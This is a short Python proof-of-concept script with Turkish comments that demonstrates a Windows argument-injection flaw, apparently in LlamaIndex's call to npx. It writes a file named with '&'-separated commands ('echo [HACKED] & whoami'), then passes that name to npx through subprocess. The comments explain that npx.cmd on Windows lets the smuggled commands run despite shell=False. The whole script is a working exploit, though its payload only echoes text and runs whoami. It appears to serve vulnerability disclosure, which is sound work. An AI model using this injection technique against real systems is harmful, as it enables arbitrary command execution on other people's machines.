import subprocess
import os
import sys

def run_vulnerable_logic():
    print("--- Windows Argument Injection PoC ---")
    
    # 1. Malicious path (LlamaIndex'in 'path' olarak kabul ettiği değişken)
    # Windows'ta '&' komut ayırıcıdır.
    malicious_path = "nothing & echo [HACKED] & whoami & echo [HACKED]"
    
    # 2. Dosyayı fiziksel olarak oluşturmamız lazım çünkü os.path.exists kontrolü var
    with open(malicious_path, "w") as f:
        f.write("test")

    print(f"[*] Created file with malicious name: {malicious_path}")

    # 3. LlamaIndex'in zafiyetli komut oluşturma mantığı
    command_args = [
        "npx",
        "--version", # 'create-llama' yerine hızlıca '--version' kullanıyoruz, npx'i tetiklemek yeterli
        "--files",
        malicious_path
    ]

    print(f"[*] Executing: subprocess.run({command_args}, shell=False)")
    print("-" * 30)

    try:
        # shell=False olmasına rağmen Windows'ta npx.cmd çağrıldığı için RCE gerçekleşecek
        subprocess.run(command_args, check=False, capture_output=False)
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    run_vulnerable_logic()
